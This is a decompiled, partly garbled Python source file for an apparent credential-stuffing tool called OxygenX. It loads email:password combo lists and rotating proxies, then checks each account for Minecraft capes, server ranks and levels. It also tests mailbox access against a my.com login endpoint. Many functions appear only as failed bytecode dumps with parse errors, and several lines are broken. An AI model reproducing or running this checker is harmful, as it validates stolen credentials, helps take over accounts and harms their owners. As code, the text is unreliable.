 L. 626       104  LOAD_FAST                'self'
              106  LOAD_METHOD              prints
              108  LOAD_GLOBAL              red
              110  FORMAT_VALUE          0  ''
              112  LOAD_STR                 'Error Optifine:\n'
              114  LOAD_GLOBAL              format_exc
              116  LOAD_CONST               1
              118  LOAD_CONST               ('limit',)
              120  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              122  FORMAT_VALUE          0  ''
              124  BUILD_STRING_3        3 
              126  CALL_METHOD_1         1  ''
              128  POP_TOP          
            130_0  COME_FROM           102  '102'
              130  POP_EXCEPT       
              132  JUMP_FORWARD        136  'to 136'
              134  END_FINALLY      
            136_0  COME_FROM           132  '132'
            136_1  COME_FROM            10  '10'

 L. 627       136  LOAD_FAST                'cape'
              138  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `POP_TOP' instruction at offset 128

    def mojang--- This code section failed: ---

 L. 630         0  LOAD_CONST               False
                2  STORE_FAST               'cape'

 L. 631         4  LOAD_GLOBAL              OxygenX
                6  LOAD_ATTR                Cape
                8  LOAD_ATTR                mojang
               10  POP_JUMP_IF_FALSE   140  'to 140'

 L. 632        12  SETUP_FINALLY        96  'to 96'

 L. 633        14  LOAD_GLOBAL              session
               16  LOAD_ATTR                get
               18  LOAD_STR                 'https://crafatar.com/capes/'
               20  LOAD_FAST                'uuid'
               22  FORMAT_VALUE          0  ''
               24  BUILD_STRING_2        2 
               26  LOAD_GLOBAL              mailheaders
               28  LOAD_CONST               ('url', 'headers')
               30  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               32  LOAD_ATTR                text
               34  LOAD_METHOD              lower
               36  CALL_METHOD_0         0  ''
               38  STORE_FAST               'mine'

 L. 634        40  LOAD_STR                 'png'
               42  LOAD_FAST                'mine'
               44  COMPARE_OP               in
               46  POP_JUMP_IF_FALSE    90  'to 90'

 L. 635        48  LOAD_CONST               True
               50  STORE_FAST               'cape'

 L. 636        52  LOAD_GLOBAL              Counter
               54  DUP_TOP          
               56  LOAD_ATTR                mojang
               58  LOAD_CONST               1
               60  INPLACE_ADD      
               62  ROT_TWO          
               64  STORE_ATTR               mojang

 L. 637        66  LOAD_FAST                'self'
               68  LOAD_METHOD              writing
               70  LOAD_FAST                'combo'
               72  FORMAT_VALUE          0  ''
               74  LOAD_STR                 ' | Username: '
               76  LOAD_FAST                'user'
               78  FORMAT_VALUE          0  ''
               80  BUILD_STRING_3        3 
               82  LOAD_STR                 'MojangCape'
               84  BUILD_LIST_2          2 
               86  CALL_METHOD_1         1  ''
               88  POP_TOP          
             90_0  COME_FROM            46  '46'

 L. 638        90  LOAD_FAST                'cape'
               92  POP_BLOCK        
               94  RETURN_VALUE     
             96_0  COME_FROM_FINALLY    12  '12'

 L. 639        96  POP_TOP          
               98  POP_TOP          
              100  POP_TOP          

 L. 640       102  LOAD_GLOBAL              OxygenX
              104  LOAD_ATTR                debug
              106  POP_JUMP_IF_FALSE   134  'to 134'

 L. 641       108  LOAD_FAST                'self'
              110  LOAD_METHOD              prints
              112  LOAD_GLOBAL              red
              114  FORMAT_VALUE          0  ''
              116  LOAD_STR                 'Error MojangCape:\n'
              118  LOAD_GLOBAL              format_exc
              120  LOAD_CONST               1
              122  LOAD_CONST               ('limit',)
              124  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              126  FORMAT_VALUE          0  ''
              128  BUILD_STRING_3        3 
              130  CALL_METHOD_1         1  ''
              132  POP_TOP          
            134_0  COME_FROM           106  '106'
              134  POP_EXCEPT       
              136  JUMP_FORWARD        140  'to 140'
              138  END_FINALLY      
            140_0  COME_FROM           136  '136'
            140_1  COME_FROM            10  '10'

 L. 642       140  LOAD_FAST                'cape'
              142  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `POP_TOP' instruction at offset 132

    def labymod(self, uuid, combo, user):
        cape = False
        if OxygenX.Cape.laby:
            link = f"https://capes.labymod.net/capes/{uuid[:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:20]}-{uuid[20:]}"
            try:
                laby = session.get(url=link, headers=mailheaders).text
                if 'Not Found' not in laby:
                    cape = True
                    Counter.labymod += 1
                    self.writing([f"{combo} | Username: {user}", 'LabymodCape'])
            except:
                if OxygenX.debug:
                    self.prints(f"{red}Error Labymod:\n{format_exc(limit=1)}")

        return cape

    def liquidbounce--- This code section failed: ---

 L. 660         0  SETUP_FINALLY        24  'to 24'

 L. 661         2  LOAD_GLOBAL              session
                4  LOAD_ATTR                get

 L. 662         6  LOAD_STR                 'https://raw.githubusercontent.com/CCBlueX/FileCloud/master/LiquidBounce/cape/service.json'

 L. 663         8  LOAD_GLOBAL              mailheaders

 L. 661        10  LOAD_CONST               ('url', 'headers')
               12  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               14  LOAD_ATTR                text
               16  STORE_FAST               'lbc'

 L. 664        18  LOAD_FAST                'lbc'
               20  POP_BLOCK        
               22  RETURN_VALUE     
             24_0  COME_FROM_FINALLY     0  '0'

 L. 665        24  POP_TOP          
               26  POP_TOP          
               28  POP_TOP          

 L. 666        30  LOAD_GLOBAL              OxygenX
               32  LOAD_ATTR                debug
               34  POP_JUMP_IF_FALSE    62  'to 62'

 L. 667        36  LOAD_FAST                'self'
               38  LOAD_METHOD              prints
               40  LOAD_GLOBAL              red
               42  FORMAT_VALUE          0  ''
               44  LOAD_STR                 'Error LiquidBounce:\n'
               46  LOAD_GLOBAL              format_exc
               48  LOAD_CONST               1
               50  LOAD_CONST               ('limit',)
               52  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               54  FORMAT_VALUE          0  ''
               56  BUILD_STRING_3        3 
               58  CALL_METHOD_1         1  ''
               60  POP_TOP          
             62_0  COME_FROM            34  '34'

 L. 668        62  POP_EXCEPT       
               64  LOAD_CONST               False
               66  RETURN_VALUE     
               68  END_FINALLY      

Parse error at or near `POP_TOP' instruction at offset 60

    def hivemc(self, uuid, combo):
        rank = False
        if OxygenX.Rank.hivemc:
            try:
                response = session.get(url=f"https://www.hivemc.com/player/{uuid}", headers=mailheaders).text
                match = rankhv.search(response).group(1)
                if match != 'Regular':
                    rank = match
            except AttributeError:
                rank = False
            except:
                if OxygenX.debug:
                    self.prints(f"{red}Error HiveMC:\n{format_exc(limit=1)}")
            else:
                if rank:
                    self.writing([f"{combo} | Rank: {str(rank)}", 'HiveRanked'])
                    Counter.hivemcrank += 1
                return rank

    def mineplex(self, username, combo):
        both = [
         False, False]
        if OxygenX.Rank.mineplex or OxygenX.Level.mineplex:
            try:
                response = session.get(url=f"https://www.mineplex.com/players/{username}", headers=mailheaders).text
                if 'That player cannot be found.' in response:
                    both[0] = False
                    both[1] = False
                else:
                    both[0] = str(rankmp.search(response).group(1))
                    both[1] = int(levelmp.search(response).group(1))
                    if both[0].lower() == '':
                        both[0] = False
            except:
                if OxygenX.debug:
                    self.prints(f"{red}Error Mineplex:\n{format_exc(limit=1)}")
            else:
                if both[0]:
                    Counter.mineplexrank += 1
                    self.writing([f"{combo} | Rank: {both[0]}", 'MineplexRanked'])
                if both[1] and OxygenX.Rank.mineplex:
                    if both[1] >= OxygenX.Level.mineplex_level:
                        Counter.mineplexhl += 1
                        self.writing([f"{combo} | Level: {str(both[1])}", 'MineplexHighLevel'])
            if not both[0]:
                if not both[1]:
                    Counter.nomineplex += 1
                    self.writing([combo, 'NoMineplexLogin'])
        return both

    def hypixel(self, uuid, combo):
        both = [
         False, False, False, False, 0, 0, 0]
        if OxygenX.Rank.hypixel or OxygenX.Level.hypixel:
            try:
                answer = session.get(url=f"https://api.slothpixel.me/api/players/{uuid}", headers=mailheaders).json()
                if 'Failed to get player uuid' not in str(answer):
                    rank = str(answer['rank'])
                    if '_PLUS' in rank:
                        rank = rank.replace'_PLUS''+'
                    else:
                        level = int(answer['level'])
                        nolog = str(answer['username'])
                        bedwars_level = int(answer['stats']['BedWars']['level'])
                        bedwars_coins = int(answer['stats']['BedWars']['coins'])
                        skywars_coins = int(answer['stats']['SkyWars']['coins'])
                        if nolog == 'None':
                            both[2] = True
                        else:
                            both[0] = str(rank)
                        both[1] = int(round(level))
                        both[3] = str(datetime(1970, 1, 1, tzinfo=(timezone.utc)) + timedelta(milliseconds=(int(answer['last_login'])))).split(' ')[0]
                        both[4] = skywars_coins
                        both[5] = bedwars_level
                        both[6] = bedwars_coins
                else:
                    both[2] = True
            except:
                if OxygenX.debug:
                    self.prints(f"{red}Slothpixel API Error: \n{format_exc(limit=1)}")
            else:
                if not both[2]:
                    if str(both[0]) not in ('None', 'False'):
                        Counter.hypixelrank += 1
                        self.writing([f"{combo} | Rank: {both[0]}", 'HypixelRanked'])
                    if both[1] >= OxygenX.Level.hypixel_level:
                        Counter.hypixelhl += 1
                        self.writing([f"{combo} | Level: {str(both[1])}", 'HypixelHighLevel'])
        else:
            Counter.nohypixel += 1
            self.writing([combo, 'NoHypixelLogin'])
        return both

    def skyblock--- This code section failed: ---

 L. 760         0  SETUP_FINALLY        50  'to 50'

 L. 761         2  LOAD_STR                 'https://sky.lea.moe/stats/'
                4  LOAD_FAST                'uuid'
                6  FORMAT_VALUE          0  ''
                8  BUILD_STRING_2        2 
               10  STORE_FAST               'link'

 L. 762        12  LOAD_GLOBAL              session
               14  LOAD_ATTR                get
               16  LOAD_FAST                'link'
               18  LOAD_CONST               ('url',)
               20  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               22  LOAD_ATTR                text
               24  STORE_FAST               'check'

 L. 763        26  LOAD_STR                 'Show SkyBlock stats for'
               28  LOAD_FAST                'check'
               30  COMPARE_OP               in
               32  POP_JUMP_IF_FALSE    40  'to 40'

 L. 764        34  POP_BLOCK        
               36  LOAD_CONST               False
               38  RETURN_VALUE     
             40_0  COME_FROM            32  '32'

 L. 766        40  LOAD_FAST                'link'
               42  POP_BLOCK        
               44  RETURN_VALUE     
               46  POP_BLOCK        
               48  JUMP_FORWARD         96  'to 96'
             50_0  COME_FROM_FINALLY     0  '0'

 L. 767        50  POP_TOP          
               52  POP_TOP          
               54  POP_TOP          

 L. 768        56  LOAD_GLOBAL              OxygenX
               58  LOAD_ATTR                debug
               60  POP_JUMP_IF_FALSE    88  'to 88'

 L. 769        62  LOAD_FAST                'self'
               64  LOAD_METHOD              prints
               66  LOAD_GLOBAL              red
               68  FORMAT_VALUE          0  ''
               70  LOAD_STR                 'Error SkyBlock \n'
               72  LOAD_GLOBAL              format_exc
               74  LOAD_CONST               1
               76  LOAD_CONST               ('limit',)
               78  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               80  FORMAT_VALUE          0  ''
               82  BUILD_STRING_3        3 
               84  CALL_METHOD_1         1  ''
               86  POP_TOP          
             88_0  COME_FROM            60  '60'

 L. 770        88  POP_EXCEPT       
               90  LOAD_CONST               False
               92  RETURN_VALUE     
               94  END_FINALLY      
             96_0  COME_FROM            48  '48'

Parse error at or near `LOAD_CONST' instruction at offset 36

    def veltpvp(self, username, combo):
        rank = False
        if OxygenX.Rank.veltpvp:
            try:
                link = session.get(url=f"https://www.veltpvp.com/u/{username}", headers=mailheaders).text
                if 'Not Found' not in link:
                    rank = veltrankz.search(link).group(1)
                    if rank not in ('Default', 'Standard'):
                        rank = rank
                    else:
                        rank = False
            except AttributeError:
                rank = False
            except:
                if OxygenX.debug:
                    self.prints(f"{red}Error Veltpvp:\n{format_exc(limit=1)}")
            else:
                if rank:
                    self.writing([f"{combo} | Rank: {rank}", 'VeltRanked'])
                    Counter.veltrank += 1
        return rank

    def mailaccess(self, combo):
        email, password = combo.split':'1
        mailaccess = False
        if OxygenX.emailaccess:
            try:
                ans = session.get(url=f"https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login={email}&Password={password}",
                  headers=mailheaders).text
            except:
                if OxygenX.debug:
                    self.prints(f"{red}Error Mail Access: \n{format_exc(limit=1)}")
                ans = 'BAD'
            else:
                if ans == 'Ok=1':
                    mailaccess = True
                    Counter.mfa += 1
                    self.writing([combo, 'EmailAccess'])
                return mailaccess

    def rproxies--- This code section failed: ---

 L. 812         0  LOAD_FAST                'self'
                2  LOAD_ATTR                stop_time
                4  POP_JUMP_IF_FALSE   154  'to 154'

 L. 813         6  SETUP_FINALLY        96  'to 96'

 L. 814         8  LOAD_GLOBAL              sleep
               10  LOAD_GLOBAL              OxygenX
               12  LOAD_ATTR                Proxy
               14  LOAD_ATTR                API
               16  LOAD_ATTR                refresh
               18  CALL_FUNCTION_1       1  ''
               20  POP_TOP          

 L. 815        22  LOAD_GLOBAL              session
               24  LOAD_METHOD              get
               26  LOAD_GLOBAL              OxygenX
               28  LOAD_ATTR                Proxy
               30  LOAD_ATTR                API
               32  LOAD_ATTR                api
               34  CALL_METHOD_1         1  ''
               36  LOAD_ATTR                text
               38  LOAD_METHOD              splitlines
               40  CALL_METHOD_0         0  ''
               42  STORE_FAST               'loader'

 L. 816        44  LOAD_GLOBAL              OxygenX
               46  LOAD_ATTR                proxy_dup
               48  POP_JUMP_IF_FALSE    76  'to 76'

 L. 817        50  LOAD_GLOBAL              list
               52  LOAD_GLOBAL              set
               54  LOAD_LISTCOMP            '<code_object <listcomp>>'
               56  LOAD_STR                 'Main.rproxies.<locals>.<listcomp>'
               58  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
               60  LOAD_FAST                'loader'
               62  GET_ITER         
               64  CALL_FUNCTION_1       1  ''
               66  CALL_FUNCTION_1       1  ''
               68  CALL_FUNCTION_1       1  ''
               70  LOAD_FAST                'self'
               72  STORE_ATTR               proxylist
               74  JUMP_FORWARD         92  'to 92'
             76_0  COME_FROM            48  '48'

 L. 819        76  LOAD_LISTCOMP            '<code_object <listcomp>>'
               78  LOAD_STR                 'Main.rproxies.<locals>.<listcomp>'
               80  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
               82  LOAD_FAST                'loader'
               84  GET_ITER         
               86  CALL_FUNCTION_1       1  ''
               88  LOAD_FAST                'self'
               90  STORE_ATTR               proxylist
             92_0  COME_FROM            74  '74'
               92  POP_BLOCK        
               94  JUMP_BACK             0  'to 0'
             96_0  COME_FROM_FINALLY     6  '6'

 L. 821        96  POP_TOP          
               98  POP_TOP          
              100  POP_TOP          

 L. 822       102  LOAD_GLOBAL              OxygenX
              104  LOAD_ATTR                debug
              106  POP_JUMP_IF_FALSE   134  'to 134'

 L. 823       108  LOAD_GLOBAL              print
              110  LOAD_GLOBAL              red
              112  FORMAT_VALUE          0  ''
              114  LOAD_STR                 'Error while refreshing proxies: \n'
              116  LOAD_GLOBAL              format_exc
              118  LOAD_CONST               1
              120  LOAD_CONST               ('limit',)
              122  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              124  FORMAT_VALUE          0  ''
              126  LOAD_STR                 '\n'
              128  BUILD_STRING_4        4 
              130  CALL_FUNCTION_1       1  ''
              132  POP_TOP          
            134_0  COME_FROM           106  '106'

 L. 824       134  LOAD_GLOBAL              sleep
              136  LOAD_CONST               60
              138  CALL_FUNCTION_1       1  ''
              140  POP_TOP          

 L. 825       142  POP_EXCEPT       
              144  BREAK_LOOP          154  'to 154'
              146  POP_EXCEPT       
              148  JUMP_BACK             0  'to 0'
              150  END_FINALLY      
              152  JUMP_BACK             0  'to 0'
            154_0  COME_FROM_EXCEPT_CLAUSE   144  '144'
            154_1  COME_FROM_EXCEPT_CLAUSE     4  '4'

Parse error at or near `COME_FROM_EXCEPT_CLAUSE' instruction at offset 154_0

    def now_time(self):
        return strftime('%H:%M:%S', gmtime(time() - self.start_time))

    def loadcombo--- This code section failed: ---

 L. 832         0  SETUP_FINALLY       172  'to 172'

 L. 833         2  LOAD_GLOBAL              print
                4  LOAD_GLOBAL              cyan
                6  FORMAT_VALUE          0  ''
                8  LOAD_STR                 'Please Import Your Combo List...'
               10  BUILD_STRING_2        2 
               12  CALL_FUNCTION_1       1  ''
               14  POP_TOP          

 L. 834        16  LOAD_GLOBAL              sleep
               18  LOAD_CONST               0.3
               20  CALL_FUNCTION_1       1  ''
               22  POP_TOP          

 L. 835        24  LOAD_GLOBAL              open
               26  LOAD_GLOBAL              fileopenbox
               28  LOAD_STR                 'Load Combo List'
               30  LOAD_STR                 '*.txt'
               32  LOAD_CONST               ('title', 'default')
               34  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               36  LOAD_STR                 'r'
               38  LOAD_STR                 'utf8'

 L. 836        40  LOAD_STR                 'ignore'

 L. 835        42  LOAD_CONST               ('encoding', 'errors')
               44  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
               46  LOAD_METHOD              read
               48  CALL_METHOD_0         0  ''
               50  LOAD_METHOD              split

 L. 836        52  LOAD_STR                 '\n'

 L. 835        54  CALL_METHOD_1         1  ''
               56  STORE_FAST               'loader'

 L. 837        58  LOAD_GLOBAL              OxygenX
               60  LOAD_ATTR                combo_dup
               62  POP_JUMP_IF_FALSE    90  'to 90'

 L. 838        64  LOAD_GLOBAL              list
               66  LOAD_GLOBAL              set
               68  LOAD_GENEXPR             '<code_object <genexpr>>'
               70  LOAD_STR                 'Main.loadcombo.<locals>.<genexpr>'
               72  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
               74  LOAD_FAST                'loader'
               76  GET_ITER         
               78  CALL_FUNCTION_1       1  ''
               80  CALL_FUNCTION_1       1  ''
               82  CALL_FUNCTION_1       1  ''
               84  LOAD_FAST                'self'
               86  STORE_ATTR               accounts
               88  JUMP_FORWARD        106  'to 106'
             90_0  COME_FROM            62  '62'

 L. 840        90  LOAD_LISTCOMP            '<code_object <listcomp>>'
               92  LOAD_STR                 'Main.loadcombo.<locals>.<listcomp>'
               94  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
               96  LOAD_FAST                'loader'
               98  GET_ITER         
              100  CALL_FUNCTION_1       1  ''
              102  LOAD_FAST                'self'
              104  STORE_ATTR               accounts
            106_0  COME_FROM            88  '88'

 L. 841       106  LOAD_GLOBAL              len
              108  LOAD_FAST                'self'
              110  LOAD_ATTR                accounts
              112  CALL_FUNCTION_1       1  ''
              114  LOAD_CONST               0
              116  COMPARE_OP               ==
              118  POP_JUMP_IF_FALSE   138  'to 138'

 L. 842       120  LOAD_GLOBAL              print
              122  LOAD_GLOBAL              red
              124  FORMAT_VALUE          0  ''
              126  LOAD_STR                 'No combo found!, Please make sure file have combos...\n'
              128  BUILD_STRING_2        2 
              130  CALL_FUNCTION_1       1  ''
              132  POP_TOP          

 L. 843       134  POP_BLOCK        
              136  JUMP_BACK             0  'to 0'
            138_0  COME_FROM           118  '118'

 L. 844       138  LOAD_GLOBAL              print
              140  LOAD_GLOBAL              magenta
              142  FORMAT_VALUE          0  ''
              144  LOAD_STR                 ' > Imported '
              146  LOAD_GLOBAL              len
              148  LOAD_FAST                'self'
              150  LOAD_ATTR                accounts
              152  CALL_FUNCTION_1       1  ''
              154  FORMAT_VALUE          0  ''
              156  LOAD_STR                 ' lines'
              158  BUILD_STRING_4        4 
              160  CALL_FUNCTION_1       1  ''
              162  POP_TOP          

 L. 845       164  POP_BLOCK        
              166  BREAK_LOOP          218  'to 218'
              168  POP_BLOCK        
              170  JUMP_BACK             0  'to 0'
            172_0  COME_FROM_FINALLY     0  '0'

 L. 846       172  POP_TOP          
              174  POP_TOP          
              176  POP_TOP          

 L. 847       178  LOAD_GLOBAL              OxygenX
              180  LOAD_ATTR                debug
              182  POP_JUMP_IF_FALSE   210  'to 210'

 L. 848       184  LOAD_GLOBAL              print
              186  LOAD_GLOBAL              red
              188  FORMAT_VALUE          0  ''
              190  LOAD_STR                 'Error while loading combo: \n'
              192  LOAD_GLOBAL              format_exc
              194  LOAD_CONST               1
              196  LOAD_CONST               ('limit',)
              198  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              200  FORMAT_VALUE          0  ''
              202  LOAD_STR                 '\n'
              204  BUILD_STRING_4        4 
              206  CALL_FUNCTION_1       1  ''
              208  POP_TOP          
            210_0  COME_FROM           182  '182'
              210  POP_EXCEPT       
              212  JUMP_BACK             0  'to 0'
              214  END_FINALLY      
              216  JUMP_BACK             0  'to 0'

Parse error at or near `JUMP_BACK' instruction at offset 136

    def loadproxy--- This code section failed: ---

 L. 853       0_2  SETUP_FINALLY       426  'to 426'

 L. 854         4  LOAD_GLOBAL              OxygenX
                6  LOAD_ATTR                Proxy
                8  LOAD_ATTR                proxy
            10_12  POP_JUMP_IF_FALSE   416  'to 416'

 L. 855        14  LOAD_CONST               True
               16  STORE_FAST               'idk'

 L. 856        18  BUILD_LIST_0          0 
               20  STORE_FAST               'loader'

 L. 857        22  LOAD_GLOBAL              OxygenX
               24  LOAD_ATTR                Proxy
               26  LOAD_ATTR                API
               28  LOAD_ATTR                use
               30  POP_JUMP_IF_TRUE     92  'to 92'

 L. 858        32  LOAD_GLOBAL              print
               34  LOAD_STR                 '\n'
               36  LOAD_GLOBAL              cyan
               38  FORMAT_VALUE          0  ''
               40  LOAD_STR                 'Please Import Your Proxies List.....'
               42  BUILD_STRING_3        3 
               44  CALL_FUNCTION_1       1  ''
               46  POP_TOP          

 L. 859        48  LOAD_GLOBAL              sleep
               50  LOAD_CONST               0.3
               52  CALL_FUNCTION_1       1  ''
               54  POP_TOP          

 L. 860        56  LOAD_GLOBAL              open
               58  LOAD_GLOBAL              fileopenbox
               60  LOAD_STR                 'Load Proxies List'
               62  LOAD_STR                 '*.txt'
               64  LOAD_CONST               ('title', 'default')
               66  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               68  LOAD_STR                 'r'
               70  LOAD_STR                 'utf8'

 L. 861        72  LOAD_STR                 'ignore'

 L. 860        74  LOAD_CONST               ('encoding', 'errors')
               76  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
               78  LOAD_METHOD              read
               80  CALL_METHOD_0         0  ''
               82  LOAD_METHOD              split

 L. 861        84  LOAD_STR                 '\n'

 L. 860        86  CALL_METHOD_1         1  ''
               88  STORE_FAST               'loader'
               90  JUMP_FORWARD        236  'to 236'
             92_0  COME_FROM            30  '30'

 L. 862        92  LOAD_GLOBAL              OxygenX
               94  LOAD_ATTR                Proxy
               96  LOAD_ATTR                API
               98  LOAD_ATTR                use
              100  POP_JUMP_IF_FALSE   236  'to 236'

 L. 863       102  SETUP_FINALLY       176  'to 176'

 L. 864       104  LOAD_CONST               False
              106  STORE_FAST               'idk'

 L. 865       108  LOAD_GLOBAL              session
              110  LOAD_METHOD              get
              112  LOAD_GLOBAL              OxygenX
              114  LOAD_ATTR                Proxy
              116  LOAD_ATTR                API
              118  LOAD_ATTR                api
              120  CALL_METHOD_1         1  ''
              122  LOAD_ATTR                text
              124  LOAD_METHOD              split
              126  LOAD_STR                 '\n'
              128  CALL_METHOD_1         1  ''
              130  STORE_FAST               'loader'

 L. 866       132  LOAD_GLOBAL              OxygenX
              134  LOAD_ATTR                Proxy
              136  LOAD_ATTR                API
              138  LOAD_ATTR                refresh
              140  LOAD_CONST               30
              142  COMPARE_OP               >=
              144  POP_JUMP_IF_FALSE   172  'to 172'

 L. 867       146  LOAD_GLOBAL              Thread
              148  LOAD_FAST                'self'
              150  LOAD_ATTR                rproxies
              152  LOAD_CONST               True
              154  LOAD_CONST               ('target', 'daemon')
              156  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              158  LOAD_METHOD              start
              160  CALL_METHOD_0         0  ''
              162  POP_TOP          

 L. 868       164  LOAD_GLOBAL              sleep
              166  LOAD_CONST               2
              168  CALL_FUNCTION_1       1  ''
              170  POP_TOP          
            172_0  COME_FROM           144  '144'
              172  POP_BLOCK        
              174  JUMP_FORWARD        236  'to 236'
            176_0  COME_FROM_FINALLY   102  '102'

 L. 869       176  POP_TOP          
              178  POP_TOP          
              180  POP_TOP          

 L. 870       182  LOAD_GLOBAL              OxygenX
              184  LOAD_ATTR                debug
              186  POP_JUMP_IF_FALSE   214  'to 214'

 L. 871       188  LOAD_GLOBAL              print

 L. 872       190  LOAD_GLOBAL              red
              192  FORMAT_VALUE          0  ''
              194  LOAD_STR                 'Error while loading proxies from api: \n'
              196  LOAD_GLOBAL              format_exc
              198  LOAD_CONST               1
              200  LOAD_CONST               ('limit',)
              202  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              204  FORMAT_VALUE          0  ''
              206  LOAD_STR                 '\n'
              208  BUILD_STRING_4        4 

 L. 871       210  CALL_FUNCTION_1       1  ''
              212  POP_TOP          
            214_0  COME_FROM           186  '186'

 L. 873       214  LOAD_GLOBAL              sleep
              216  LOAD_CONST               60
              218  CALL_FUNCTION_1       1  ''
              220  POP_TOP          

 L. 874       222  POP_EXCEPT       
              224  POP_BLOCK        
          226_228  JUMP_ABSOLUTE       488  'to 488'
              230  POP_EXCEPT       
              232  JUMP_FORWARD        236  'to 236'
              234  END_FINALLY      
            236_0  COME_FROM           232  '232'
            236_1  COME_FROM           174  '174'
            236_2  COME_FROM           100  '100'
            236_3  COME_FROM            90  '90'

 L. 875       236  LOAD_GLOBAL              OxygenX
              238  LOAD_ATTR                proxy_dup
          240_242  POP_JUMP_IF_FALSE   270  'to 270'

 L. 876       244  LOAD_GLOBAL              list
              246  LOAD_GLOBAL              set
              248  LOAD_LISTCOMP            '<code_object <listcomp>>'
              250  LOAD_STR                 'Main.loadproxy.<locals>.<listcomp>'
              252  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
              254  LOAD_FAST                'loader'
              256  GET_ITER         
              258  CALL_FUNCTION_1       1  ''
              260  CALL_FUNCTION_1       1  ''
              262  CALL_FUNCTION_1       1  ''
              264  LOAD_FAST                'self'
              266  STORE_ATTR               proxylist
              268  JUMP_FORWARD        286  'to 286'
            270_0  COME_FROM           240  '240'

 L. 878       270  LOAD_LISTCOMP            '<code_object <listcomp>>'
              272  LOAD_STR                 'Main.loadproxy.<locals>.<listcomp>'
              274  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
              276  LOAD_FAST                'loader'
              278  GET_ITER         
              280  CALL_FUNCTION_1       1  ''
              282  LOAD_FAST                'self'
              284  STORE_ATTR               proxylist
            286_0  COME_FROM           268  '268'

 L. 879       286  LOAD_GLOBAL              len
              288  LOAD_FAST                'self'
              290  LOAD_ATTR                proxylist
              292  CALL_FUNCTION_1       1  ''
              294  STORE_FAST               'length_file'

 L. 880       296  LOAD_FAST                'length_file'
              298  LOAD_CONST               0
              300  COMPARE_OP               ==
          302_304  POP_JUMP_IF_FALSE   326  'to 326'

 L. 881       306  LOAD_GLOBAL              print
              308  LOAD_GLOBAL              red
              310  FORMAT_VALUE          0  ''
              312  LOAD_STR                 'No proxies found! Please make sure file have proxies...'
              314  BUILD_STRING_2        2 
              316  CALL_FUNCTION_1       1  ''
              318  POP_TOP          

 L. 882       320  POP_BLOCK        
              322  JUMP_BACK             0  'to 0'
              324  JUMP_FORWARD        374  'to 374'
            326_0  COME_FROM           302  '302'

 L. 883       326  LOAD_FAST                'length_file'
              328  LOAD_CONST               0
              330  COMPARE_OP               ==
          332_334  POP_JUMP_IF_FALSE   374  'to 374'
              336  LOAD_GLOBAL              OxygenX
              338  LOAD_ATTR                Proxy
              340  LOAD_ATTR                API
          342_344  POP_JUMP_IF_FALSE   374  'to 374'

 L. 884       346  LOAD_GLOBAL              print
              348  LOAD_GLOBAL              red
              350  FORMAT_VALUE          0  ''
              352  LOAD_STR                 'No proxies found in API, OxygenX will exit in 3 seconds...'
              354  BUILD_STRING_2        2 
              356  CALL_FUNCTION_1       1  ''
              358  POP_TOP          

 L. 885       360  LOAD_GLOBAL              sleep
              362  LOAD_CONST               3
              364  CALL_FUNCTION_1       1  ''
              366  POP_TOP          

 L. 886       368  LOAD_GLOBAL              exit
              370  CALL_FUNCTION_0       0  ''
              372  POP_TOP          
            374_0  COME_FROM           342  '342'
            374_1  COME_FROM           332  '332'
            374_2  COME_FROM           324  '324'

 L. 887       374  LOAD_GLOBAL              print
              376  LOAD_GLOBAL              magenta
              378  FORMAT_VALUE          0  ''
              380  LOAD_STR                 ' > Imported '
              382  LOAD_FAST                'length_file'
              384  FORMAT_VALUE          0  ''
              386  LOAD_STR                 ' proxies from '
              388  LOAD_FAST                'idk'
          390_392  POP_JUMP_IF_FALSE   398  'to 398'
              394  LOAD_STR                 'File'
              396  JUMP_FORWARD        400  'to 400'
            398_0  COME_FROM           390  '390'
              398  LOAD_STR                 'API'
            400_0  COME_FROM           396  '396'
              400  FORMAT_VALUE          0  ''
              402  BUILD_STRING_5        5 
              404  CALL_FUNCTION_1       1  ''
              406  POP_TOP          

 L. 888       408  POP_BLOCK        
          410_412  JUMP_ABSOLUTE       488  'to 488'
              414  JUMP_FORWARD        422  'to 422'
            416_0  COME_FROM            10  '10'

 L. 890       416  POP_BLOCK        
          418_420  JUMP_ABSOLUTE       488  'to 488'
            422_0  COME_FROM           414  '414'
              422  POP_BLOCK        
              424  JUMP_BACK             0  'to 0'
            426_0  COME_FROM_FINALLY     0  '0'

 L. 891       426  POP_TOP          
              428  POP_TOP          
              430  POP_TOP          

 L. 892       432  LOAD_GLOBAL              OxygenX
              434  LOAD_ATTR                debug
          436_438  POP_JUMP_IF_FALSE   466  'to 466'

 L. 893       440  LOAD_GLOBAL              print
              442  LOAD_GLOBAL              red
              444  FORMAT_VALUE          0  ''
              446  LOAD_STR                 'Error while loading proxies: \n'
              448  LOAD_GLOBAL              format_exc
              450  LOAD_CONST               1
              452  LOAD_CONST               ('limit',)
              454  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              456  FORMAT_VALUE          0  ''
              458  LOAD_STR                 '\n'
              460  BUILD_STRING_4        4 
              462  CALL_FUNCTION_1       1  ''
              464  POP_TOP          
